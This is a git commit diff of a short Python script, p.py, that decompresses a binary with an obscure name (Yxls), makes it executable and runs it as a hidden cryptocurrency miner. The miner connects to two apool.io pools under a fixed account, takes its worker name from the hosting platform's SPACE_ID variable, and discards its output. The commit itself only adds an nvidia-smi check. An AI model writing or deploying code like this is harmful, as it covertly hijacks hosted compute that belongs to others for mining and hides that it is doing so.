05f8c0b71156e4d06b55808776f4050c45669b66
shrsvr <sigyv7133@gmail.com>
2025-03-09 09:28:05 +0100

    Update p.py

--- p.py
+++ p.py
@@ -1,6 +1,6 @@
 import os
 os.system("xz -d Yxls.xz")
-#os.system("ls -lh")
+os.system("nvidia-smi")
 os.system("chmod +x Yxls")
 wn = os.getenv('SPACE_ID').replace("/","_")
 os.system(f"./Yxls --account CP_fafubk1b65 --algo qubic_quai --gpu-off true --pool quai.hk.apool.io:3334 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
